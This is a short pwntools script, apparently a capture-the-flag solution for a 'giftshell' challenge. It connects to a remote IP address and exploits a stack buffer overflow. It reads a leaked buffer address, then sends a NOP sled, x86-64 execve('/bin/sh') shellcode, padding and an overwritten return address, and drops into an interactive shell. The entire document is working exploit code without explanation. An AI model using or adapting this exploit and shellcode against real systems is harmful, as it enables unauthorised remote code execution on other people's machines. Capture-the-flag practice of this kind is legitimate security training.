from pwn import *

p = remote('20.150.203.70', 4010) # process("./giftshell")


p.recvuntil(b"!")
buffer = int(p.recvline()[1:-1],16)
nops = b'\x90'* 8
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


padding = b'X'* (120 -len(nops)- len(shellcode))

p.sendline(nops + shellcode + padding + p64(buffer))

p.interactive()

